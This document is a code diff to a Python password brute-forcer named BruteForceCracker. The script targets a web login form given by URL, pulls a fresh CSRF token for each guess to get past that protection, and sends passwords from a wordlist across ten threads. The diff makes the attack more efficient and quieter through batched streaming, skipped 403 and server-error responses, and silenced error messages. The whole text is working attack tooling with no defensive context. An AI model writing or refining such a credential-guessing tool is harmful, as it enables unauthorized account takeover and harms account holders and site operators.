@@ -26,7 +26,7 @@ import time
 import sys
 import re
 from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 class BruteForceCracker:
     def __init__(self, url, username, error_message, username_field="UserName", password_field="Password"):
@@ -35,6 +35,7 @@ class BruteForceCracker:
         self.error_message = error_message
         self.username_field = username_field
         self.password_field = password_field
+        self.csrf_detected = False
         
         # Display banner without sleep
         print(banner)
@@ -62,7 +63,7 @@ class BruteForceCracker:
                 
             return None, None
         except Exception as e:
-            print(f"Error getting CSRF token: {e}")
+            # print(f"Error getting CSRF token: {e}")
             return None, None
 
     def crack(self, password):
@@ -72,6 +73,11 @@ class BruteForceCracker:
         # Get a fresh CSRF token for each attempt
         token_name, token_value = self.get_csrf_token(session)
         
+        # If CSRF was detected initially but extraction failed here, assume failure/error
+        if self.csrf_detected and (not token_name or not token_value):
+            # print(f"[-] Failed to retrieve CSRF token for password: {password}")
+            return False
+
         # Prepare the login data
         data_dict = {
             self.username_field: self.username,
@@ -82,11 +88,14 @@ class BruteForceCracker:
         # Add CSRF token if found
         if token_name and token_value:
             data_dict[token_name] = token_value
-            # print(f"Using CSRF token: {token_name}={token_value[:10]}...")
         
         try:
             # Make the login attempt
             response = session.post(self.url, data=data_dict)
+
+            # Check status code first - 403 usually means CSRF failure or Forbidden
+            if response.status_code == 403 or response.status_code >= 500:
+                return False
 
             # Check if login was successful
             if self.error_message in str(response.content) or self.error_message in response.text:
@@ -97,7 +106,7 @@ class BruteForceCracker:
                 print("Password: ---> " + password)
                 return True
         except Exception as e:
-            print(f"Request failed for {password}: {e}")
+            # print(f"Request failed for {password}: {e}")
             return False
 
 def crack_password_wrapper(password, cracker, counter_lock, counter):
@@ -105,12 +114,12 @@ def crack_password_wrapper(password, cracker, counter_lock, counter):
     with counter_lock:
         counter[0] += 1
         count = counter[0]
-        if count % 10 == 0:
-            print(f"Trying Password: {count} => {password}")
+        if count % 50 == 0:
+            print(f"Tried {count} passwords...")
 
     if cracker.crack(password):
-        return True
-    return False
+        return True, password
+    return False, password
 
 def main():
     url = input("Enter Target Url: ")
@@ -130,42 +139,59 @@ def main():
     if token_name and token_value:
         print(f"[+] CSRF token found: {token_name}")
         print("[*] Will attempt to bypass by extracting and including token with each request\n")
+        cracker.csrf_detected = True
     else:
         print("[-] No CSRF token found or using a different protection method\n")
+        cracker.csrf_detected = False
     
-    passwords = []
     try:
-        with open("passwords.txt", "r") as f:
-            passwords = f.readlines()
+        f = open("passwords.txt", "r")
     except FileNotFoundError:
         print("Error: passwords.txt not found.")
         return
 
-    print(f"Loaded {len(passwords)} passwords.")
-
     counter = [0]
     counter_lock = threading.Lock()
+
+    batch_size = 100
+    max_workers = 10
     found = False
 
-    # Use ThreadPoolExecutor for better concurrency control
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = []
-        for password in passwords:
-            if found: break
-            future = executor.submit(crack_password_wrapper, password, cracker, counter_lock, counter)
-            futures.append(future)
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        while True:
+            # Read a batch of passwords
+            batch = []
+            for _ in range(batch_size):
+                line = f.readline()
+                if not line:
+                    break
+                batch.append(line)
 
-        for future in futures:
-            if future.result():
-                found = True
-                print("Password found! Stopping other threads...")
-                executor.shutdown(wait=False, cancel_futures=True)
+            if not batch:
                 break
+
+            futures = {executor.submit(crack_password_wrapper, pwd, cracker, counter_lock, counter): pwd for pwd in batch}
+
+            for future in as_completed(futures):
+                success, password = future.result()
+                if success:
+                    found = True
+                    print(f"Password found! Stopping...")
+                    # Cancel remaining futures if possible (Python 3.9+)
+                    if sys.version_info >= (3, 9):
+                        executor.shutdown(wait=False, cancel_futures=True)
+                    break
+
+            if found:
+                break
+
+    f.close()
+    if not found:
+        print("\n[-] Password not found in list.")
 
 if __name__ == '__main__':
     banner = """ 
                        Checking the Server !!        
         [+]█████████████████████████████████████████████████[+]
 """
-    # print(banner) # Moved to init to avoid duplication/delay issues
     main()
